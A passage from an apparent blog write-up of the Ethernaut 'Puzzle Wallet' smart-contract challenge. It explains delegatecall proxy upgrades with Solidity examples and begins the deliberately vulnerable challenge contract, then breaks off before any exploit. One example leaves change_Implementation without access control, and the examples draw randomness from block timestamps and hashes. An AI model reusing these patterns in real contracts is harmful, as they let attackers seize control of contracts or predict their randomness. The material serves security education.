<style>pre{position:relative;padding-top:1.5em}.copy-button{position:absolute;top:8px;right:8px;padding:4px 8px;font-size:12px;background-color:#555;color:#fff;border:none;border-radius:4px;cursor:pointer;opacity:.8;transition:opacity .3s,background-color .3s}.copy-button:hover{opacity:1;background-color:#333}.copy-button:active{background-color:#222}</style><!doctype html><html class=position-relative itemscope itemtype=https://schema.org/WebPage lang=en data-bs-theme=auto data-palette=blue><head><script src=/assets/init/bundle.min.5d926f39b9560d169df61400c683a4a6bf98ae34435563467342e88a51e66b49.js integrity="sha256-XZJvOblWDRad9hQAxoOkpr+YrjRDVWNGc0LoilHma0k=" crossorigin=anonymous></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>PuzzleWallet - S4b03ur's Website</title><link rel=icon href=/favicon_hu_b34762d1804ef570.png sizes=16x16 type=image/png><link rel=icon href=/favicon_hu_232ee76de806a9fb.png sizes=32x32 type=image/png><link rel=icon href=/favicon_hu_87b8209e5c029d7f.png sizes=150x150 type=image/png><link rel=apple-touch-icon href=/favicon_hu_471014c70a45ada4.png sizes=180x180 type=image/png><link rel=icon href=/favicon_hu_cd126433966a366f.png sizes=192x192 type=image/png><link rel=mask-icon href=/safari-pinned-tab.svg color=#6f42c1><meta name=keywords content><meta name=description content="Writeup for Puzzle Wallet

Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you&rsquo;re new to Solidity and haven&rsquo;t deployed a smart contract before, you can learn how to do so using Remix here.


Challenge Description
Nowadays, paying for DeFi operations is impossible, fact."><meta name=twitter:card content="summary"><meta name=twitter:title content="PuzzleWallet"><meta name=twitter:description content="Writeup for Puzzle Wallet Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you’re new to Solidity and haven’t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Nowadays, paying for DeFi operations is impossible, fact."><meta name=twitter:site content="@s4bot3ur"><meta property="og:url" content="https://s4bot3ur.github.io/blogs/ethernaut/puzzlewallet/"><meta property="og:site_name" content="S4b03ur's Website"><meta property="og:title" content="PuzzleWallet"><meta property="og:description" content="Writeup for Puzzle Wallet Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you’re new to Solidity and haven’t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Nowadays, paying for DeFi operations is impossible, fact."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blogs"><meta property="article:published_time" content="2024-10-23T01:18:13+05:30"><meta property="article:modified_time" content="2024-12-30T12:20:32+05:30"><meta property="article:tag" content="Delegate Call"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/stake/"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/higherorder/"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/switch/"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/gatekeeperthree/"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/goodsamaritan/"><meta property="og:see_also" content="https://s4bot3ur.github.io/blogs/ethernaut/doubleentrypoint/"><meta itemprop=name content="PuzzleWallet"><meta itemprop=description content="Writeup for Puzzle Wallet Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you’re new to Solidity and haven’t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Nowadays, paying for DeFi operations is impossible, fact."><meta itemprop=datePublished content="2024-10-23T01:18:13+05:30"><meta itemprop=dateModified content="2024-12-30T12:20:32+05:30"><meta itemprop=wordCount content="3869"><meta itemprop=keywords content="Delegate Call"><meta property="og:image" content="https://s4bot3ur.github.io/images/logo.png"><meta name=twitter:image content="https://s4bot3ur.github.io/images/logo.png"><meta property="og:image:alt" content="PuzzleWallet"><meta name=twitter:image:alt content="PuzzleWallet"><link data-precache rel=stylesheet href="/assets/main/bundle.min.a5fd428d52638e0104c79f2ace101bf527c9a5a5824d56e3b8e2e834da34d6cc.css" integrity="sha256-pf1CjVJjjgEEx58qzhAb9SfJpaWCTVbjuOLoNNo01sw=" crossorigin=anonymous><link data-precache rel=stylesheet href=/assets/viewer/bundle.min.8c1002839fa22c1350d6ae1eef6593120e108f973c41348be9b5065430566aaf.css integrity="sha256-jBACg5+iLBNQ1q4e72WTEg4Qj5c8QTSL6bUGVDBWaq8=" crossorigin=anonymous><html lang=en><head></head><body><script data-goatcounter=https://s4bot3ur.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html></head><body><header class="mb-4 sticky-top"><nav class="top-app-bar shadow navbar navbar-expand-xxl"><div class=container><a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2" href=https://s4bot3ur.github.io/><picture><img class=logo alt=Logo src="https://s4bot3ur.github.io/images/logo.webp?v=9f103176f1a34038dc9b17c233d400ef" loading=lazy width=400 height=400>
</picture>S4b03ur's Website</a><div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll=true tabindex=-1 id=navbarMenus aria-labelledby=navbarMenusLabel><div class="offcanvas-header px-4 pb-0"><div class="offcanvas-title h5" id=navbarMenusLabel>S4b03ur's Website</div><button type=button class="btn-close btn-close-white" data-bs-dismiss=offcanvas data-bs-target=#navbarMenus aria-label=Close></button></div><div class="offcanvas-body p-4 pt-0 p-xxl-0"><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto"><a class="nav-link py-2 px-0 px-xxl-2" href=https://s4bot3ur.github.io/><span class="menu-icon me-1"><i class="fa-solid fa-house"></i></span>Home</a></li><li class="nav-item col-12 col-xxl-auto dropdown px-0"><a href=# class="nav-link dropdown-toggle" id=navbarDropdownBlog role=button data-bs-toggle=dropdown aria-expanded=false><span class="menu-icon me-1"><i class="fas fa-blog"></i></span>Blog</a><ul class="dropdown-menu dropdown-menu-end" aria-labelledby=navbarDropdownBlog data-bs-popper=none><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/categories/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-folder" style=color:#0581e6></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Categories</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/series/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fas fa-book" style=color:#ff5733></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Series</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/tags/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-tags" style=color:#b197fc></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Tags</p></div></a></li></ul></li></ul><hr class=d-xxl-none><form class="search-bar ms-auto my-auto" action=/search/ novalidate><div class="input-group align-items-center"><span class="btn btn-search disabled position-absolute left-0 border-0 px-1"><i class="fas fa-fw fa-search fa-lg"></i>
</span><input class="my-1 form-control border-white rounded-5 search-input bg-body" name=q type=search placeholder=Search aria-label=Search required>
<span class="search-shortcut position-absolute end-0 top-0 me-2"><kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd></span></div></form><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto"><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=fontSizeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-font"></i>
<span class=d-xxl-none>Font Size</span></a><ul class="font-size-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=fontSizeDropdown><li><button class="font-size-item dropdown-item" data-size=xs>
Extra Small</button></li><li><button class="font-size-item dropdown-item" data-size=sm>
Small</button></li><li><button class="font-size-item dropdown-item active" data-size=md>
Medium</button></li><li><button class="font-size-item dropdown-item" data-size=lg>
Large</button></li><li><button class="font-size-item dropdown-item" data-size=xl>
Extra Large</button></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=paletteDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-palette"></i>
<span class=d-xxl-none>Palette</span></a><ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby=paletteDropdown><li class="col-4 my-1"><a role=button id=palette-blue aria-label=Blue class="btn btn-sm w-100 palette text-bg-blue" data-palette=blue></a></li><li class="col-4 my-1"><a role=button id=palette-blue-gray aria-label="Blue Gray" class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette=blue-gray></a></li><li class="col-4 my-1"><a role=button id=palette-brown aria-label=Brown class="btn btn-sm w-100 palette text-bg-brown" data-palette=brown></a></li><li class="col-4 my-1"><a role=button id=palette-cyan aria-label=Cyan class="btn btn-sm w-100 palette text-bg-cyan" data-palette=cyan></a></li><li class="col-4 my-1"><a role=button id=palette-green aria-label=Green class="btn btn-sm w-100 palette text-bg-green" data-palette=green></a></li><li class="col-4 my-1"><a role=button id=palette-indigo aria-label=Indigo class="btn btn-sm w-100 palette text-bg-indigo" data-palette=indigo></a></li><li class="col-4 my-1"><a role=button id=palette-orange aria-label=Orange class="btn btn-sm w-100 palette text-bg-orange" data-palette=orange></a></li><li class="col-4 my-1"><a role=button id=palette-pink aria-label=Pink class="btn btn-sm w-100 palette text-bg-pink" data-palette=pink></a></li><li class="col-4 my-1"><a role=button id=palette-purple aria-label=Purple class="btn btn-sm w-100 palette text-bg-purple" data-palette=purple></a></li><li class="col-4 my-1"><a role=button id=palette-red aria-label=Red class="btn btn-sm w-100 palette text-bg-red" data-palette=red></a></li><li class="col-4 my-1"><a role=button id=palette-teal aria-label=Teal class="btn btn-sm w-100 palette text-bg-teal" data-palette=teal></a></li><li class="col-4 my-1"><a role=button id=palette-yellow aria-label=Yellow class="btn btn-sm w-100 palette text-bg-yellow" data-palette=yellow></a></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=modeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="mode-icon fas fa-fw fa-adjust" id=modeIcon></i>
<span class=d-xxl-none>Mode</span></a><ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=modeDropdown><li class=mode-item data-color-mode=light data-icon=sun><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-sun"></i> Light</button></li><li class=mode-item data-color-mode=dark data-icon=moon><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-moon"></i> Dark</button></li><li class="mode-item active" data-color-mode=auto data-icon=adjust><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-adjust"></i> Auto</button></li></ul></li></ul></div></div><div class=d-flex><button class="navbar-toggler order-5 border-0" type=button data-bs-toggle=offcanvas data-bs-target=#navbarMenus aria-controls=navbarMenus aria-expanded=false aria-label="Toggle navigation">
<i class="fas fa-ellipsis-h"></i></button></div></div></nav></header><main class="container has-sidebar" data-kind=page><script data-precache src=/js/main-init.f131b3003675b524fbeffa5f8c7bbe43d5118e4a90455757e97f9e8ffee990a9.js integrity="sha256-8TGzADZ1tST77/pfjHu+Q9URjkqQRVdX6X+ej/7pkKk=" crossorigin=anonymous></script><div class="row content"><noscript><div class="alert alert-danger" role=alert>Your browser does not support JavaScript.</div></noscript><div class="content-posts col-xxl-8"><div class=container><nav class="row card component" aria-label=breadcrumb><div class="card-body pb-0"><ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href=/>Home</a></li><li class="breadcrumb-item text-surface"><a href>Blogs</a></li><li class="breadcrumb-item text-surface"><a href>Ethernaut</a></li><li class="breadcrumb-item active">PuzzleWallet</li></ol></div></nav><div class="post-panel-wrapper position-relative d-flex justify-content-center"><div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1"><a class="action action-toc d-none d-xxl-block" href=#postTOC role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
</a><a class="action action-toc d-block d-xxl-none" href=#post-toc-container role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
</a><a class="action action-post-comments" href=#post-comments role=button aria-label=Comments title=Comments><i class="fas fa-fw fa-comments"></i>
</a><a id=sidebarToggler class="action action-sidebar-toggler d-none d-xxl-block" role=button title="Toggle sidebar"><i class="fas fa-fw fa-expand-alt" data-fa-transform=rotate-45></i></a></div></div><article class="row card component mb-4 post"><div class=card-header><h1 class="card-title post-title my-2">PuzzleWallet</h1></div><div class=card-body><div class="post-meta mb-3"><span class="post-date me-1 mb-1" title="created on 2024-10-22 19:48:13 +0000 UTC, updated on 2024-12-30 06:50:32 +0000 UTC.">October 23, 2024</span><span class="post-reading-time me-1 mb-1">19 min read</span><a href=/categories/blockchain/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
<i class="fas fa-fw fa-folder me-1"></i>Blockchain</a><a href=/series/ethernaut/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-series">
<i class="fas fa-fw fa-columns me-1"></i>Ethernaut</a><a href=/tags/delegate-call/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Delegate Call</a></div><div class="mt-2 mb-3 d-block d-xxl-none"><h2 class="text-surface mb-3">Contents</h2><div id=post-toc-container></div><hr class=text-secondary></div><div class="post-content mb-3" data-bs-spy=scroll data-bs-target=#TableOfContents tabindex=0><div id=post-content-body><h1 id=writeup-for-puzzle-wallet data-numberify>Writeup for Puzzle Wallet<a class="anchor ms-1" href=#writeup-for-puzzle-wallet></a></h1><ul><li>Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you&rsquo;re new to Solidity and haven&rsquo;t deployed a smart contract before, you can learn how to do so using Remix <a href="https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k" target=_blank rel="noopener noreferrer">here<i class="fas fa-external-link-square-alt ms-1"></i></a>.</li></ul><h3 id=challenge-description data-numberify>Challenge Description<a class="anchor ms-1" href=#challenge-description></a></h3><p>Nowadays, paying for DeFi operations is impossible, fact.</p><p>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.</p><p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.</p><p>Little did they know, their lunch money was at risk…</p><p>You&rsquo;ll need to hijack this wallet to become the admin of the proxy.</p><p>Things that might help:</p><ul><li>Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.</li><li>Knowing about proxy patterns and the way they handle storage variables.</li></ul><h3 id=key-concepts-to-learn data-numberify>Key Concepts To Learn<a class="anchor ms-1" href=#key-concepts-to-learn></a></h3><p>Everyone will say that once we write a contract and deploy it to the blockchain, there is no way we can change the contract. But what if I say there is a way in which you can change the logic of your contract?</p><p>Yes, there is a way to upgrade smart contracts.</p><p>If we write all our state variables in one contract and write the logic of how the first contract should work in another contract, then make a delegate call from the state variables contract to the logic contract, all the logic will be executed in the logic contract and state changes will be done in the state variables contract. Confused? Check the example below.</p><p>Check the below example.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kd>contract</span> <span class=nc>State_contract</span><span class=p>{</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>
</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>Latest_Random_Number</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=kt>address</span> <span class=n>implementation</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_addr</span><span class=p>){</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=n>implementation</span><span class=o>=</span><span class=n>_addr</span><span class=p>;</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>
</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=kd>function</span> <span class=nf>get_RandomNumber</span><span class=p>()</span> <span class=k>public</span> <span class=k>returns</span><span class=p>(</span><span class=kt>uint256</span><span class=p>){</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=n>implementation</span><span class=p>.</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;generate_RandomNumber()&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>
</span></span><span class=line><span class=ln>18</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>
</span></span><span class=line><span class=ln>20</span><span class=cl><span class=kd>contract</span> <span class=nc>Logic_contract</span><span class=p>{</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>Latest_Random_Number</span><span class=p>;</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>
</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=kd>function</span> <span class=nf>generate_RandomNumber</span><span class=p>()</span> <span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=n>Latest_Random_Number</span><span class=o>=</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>)</span><span class=o>%</span><span class=mi>69</span><span class=p>;</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>
</span></span><span class=line><span class=ln>26</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>27</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>First, we need to deploy the <code>Logic_contract</code>. Then we need to deploy the <code>State_contract</code> by passing the address of the <code>Logic_contract</code> as an argument to the constructor.</p><p>When we call <code>get_RandomNumber()</code> in <code>State_contract</code>, the function will make a <code>delegate call</code> to <code>generate_RandomNumber()</code> in <code>Logic_contract</code> and set the <code>Latest_Random_Number</code> to <code>(block.timestamp)%69</code>. Now, since it is a <code>delegate call</code>, the logic will be executed in the <code>Logic_contract</code> and the variable <code>Latest_Random_Number</code> will be changed in the <code>State_contract</code>.</p><p>I hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.</p><p>Now, what if we wanted to change the method in which the random number is generated? Should we deploy the above two contracts again? No, instead of deploying the two contracts again, we can add one more function to change the implementation (logic contract) address during the first deployment itself. Check the example below.</p><p>Check the below example.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kd>contract</span> <span class=nc>State_contract</span><span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>Latest_Random_Number</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=kt>address</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=kt>address</span> <span class=n>implementation</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_addr</span><span class=p>){</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=n>implementation</span><span class=o>=</span><span class=n>_addr</span><span class=p>;</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=n>owner</span><span class=o>=</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=kd>modifier</span> <span class=nf>onlyOwner</span><span class=p>(){</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=o>==</span><span class=n>owner</span><span class=p>);</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=kd>function</span> <span class=nf>get_RandomNumber</span><span class=p>()</span><span class=k>public</span> <span class=k>returns</span><span class=p>(</span><span class=kt>uint256</span><span class=p>){</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=n>implementation</span><span class=p>.</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;generate_RandomNumber()&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=kd>function</span> <span class=nf>change_Implementation</span><span class=p>(</span><span class=kt>address</span> <span class=n>_newImplementation</span><span class=p>)</span><span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=n>implementation</span><span class=o>=</span><span class=n>_newImplementation</span><span class=p>;</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>24</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>
</span></span><span class=line><span class=ln>26</span><span class=cl><span class=kd>contract</span> <span class=nc>Logic_contract</span><span class=p>{</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>Latest_Random_Number</span><span class=p>;</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>
</span></span><span class=line><span class=ln>29</span><span class=cl>    <span class=kd>function</span> <span class=nf>generate_RandomNumber</span><span class=p>()</span><span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=n>Latest_Random_Number</span><span class=o>=</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>)</span><span class=o>%</span><span class=mi>69</span><span class=p>;</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>32</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>33</span><span class=cl>
</span></span><span class=line><span class=ln>34</span><span class=cl><span class=kd>contract</span> <span class=nc>Updated_Logic_contract</span><span class=p>{</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>Latest_Random_Number</span><span class=p>;</span>
</span></span><span class=line><span class=ln>36</span><span class=cl>
</span></span><span class=line><span class=ln>37</span><span class=cl>    <span class=kd>function</span> <span class=nf>generate_RandomNumber</span><span class=p>()</span><span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln>38</span><span class=cl>        <span class=n>Latest_Random_Number</span><span class=o>=</span><span class=kt>uint256</span><span class=p>(</span><span class=nb>blockhash</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>number</span><span class=o>-</span><span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=ln>39</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>40</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Deploy the first two contracts same as the first example. The difference between <code>State_contract</code> in the first example and now is that we added a function to change the address of the implementation in the new example.</p><p>So, if we deploy this example same as the first example, whenever we call the <code>get_RandomNumber()</code> function, it will make a <code>delegate call</code> to <code>Logic_contract</code> and execute the logic in <code>Logic_contract</code>, changing the <code>Latest_Random_Number</code> in <code>State_contract</code>. Now, the logic in which the random number is determined is <code>(block.timestamp)%69</code>.</p><p>Suppose we wanted to change the logic in which the random number is generated. Now, what we do is write a new contract with a new logic for random number calculation and deploy the new contract. Once the deployment is completed, we will copy the address of the new logic address and pass the new logic address while calling the <code>change_Implementation()</code> function in the Logic contract.</p><p>The next time we call <code>get_RandomNumber()</code> in <code>State_contract</code>, the random number will be generated from the new logic contract. In this example, we have written a new contract named <code>Updated_Logic_contract</code> and changed the logic in which the random number is generated.</p><p>I hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.</p><h3 id=contract-explanation data-numberify>Contract Explanation<a class="anchor ms-1" href=#contract-explanation></a></h3><p>If you are in this challenge, then you would have probably solved the challenges related to delegate call and storage layout of contracts.</p><p>If you understand the contract, you can move on to the <a href=/blogs/ethernaut/puzzlewallet/#exploit>exploit</a> part. If you&rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=k>pragma experimental</span> <span class=n>ABIEncoderV2</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>
</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=kn>import</span> <span class=s>&#34;../helpers/UpgradeableProxy-08.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=kd>contract</span> <span class=nc>PuzzleProxy</span> <span class=k>is</span> <span class=n>UpgradeableProxy</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>pendingAdmin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>admin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_admin</span><span class=p>,</span> <span class=kt>address</span> <span class=n>_implementation</span><span class=p>,</span> <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>_initData</span><span class=p>)</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=n>UpgradeableProxy</span><span class=p>(</span><span class=n>_implementation</span><span class=p>,</span> <span class=n>_initData</span><span class=p>)</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=n>admin</span> <span class=o>=</span> <span class=n>_admin</span><span class=p>;</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>
</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=kd>modifier</span> <span class=nf>onlyAdmin</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>admin</span><span class=p>,</span> <span class=s>&#34;Caller is not the admin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>
